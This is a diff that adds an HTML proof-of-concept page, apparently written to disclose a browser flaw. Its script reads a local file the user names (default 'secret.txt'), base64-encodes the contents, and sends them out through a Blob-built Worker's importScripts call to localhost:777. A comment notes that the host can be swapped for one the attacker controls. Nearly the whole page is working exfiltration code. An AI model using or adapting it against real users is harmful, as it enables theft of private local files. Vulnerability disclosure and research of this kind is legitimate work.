@@ -1,0 +1,36 @@
+<html>
+<head>
+    <title>Sensitive data disclosure PoC - @qab</title>
+    <script type="application/javascript">
+	window.onload=$=>{
+		var doQ=(q)=>{//Simple XMLHttpRequest
+			try{
+			var oReq = new XMLHttpRequest();
+				oReq.addEventListener("load", function(e){console.dir(e)});
+				oReq.open("GET", q,false);
+				oReq.send();
+			setTimeout($=>{
+					qSend(btoa(oReq.response));//contents of local file are base64 encoded and sent
+					qContents.value=oReq.response;	
+			},100);
+			}catch(e){alert('File not found or restricted.')};
+		};
+		var qSend=(q)=>{
+				new Worker(URL.createObjectURL(new Blob(['importScripts("http://localhost:777/'+q+'")'])));//This is the key, it will create a credentialed request to the remote host with the data
+			//localhost can be changed to an attacker controlled host and data may be collected that way (viewing request logs)
+		};
+		qGo.onclick=(q)=>{
+			doQ(qFile.value);
+		};
+	};
+    </script>
+</head>
+<body>
+<h3>Please open console and view network activity before pressing 'Go'</h3>
+<input type="input" id="qFile" value="secret.txt"/>
+<input type="button" id="qGo" value="Go"/>
+<br>
+<textarea cols=100 rows=11 id="qContents"></textarea><br>
+<h3>There should be a request sent to an external website containing the base64 encoded contents of local file</h3>
+</body>
+</html>
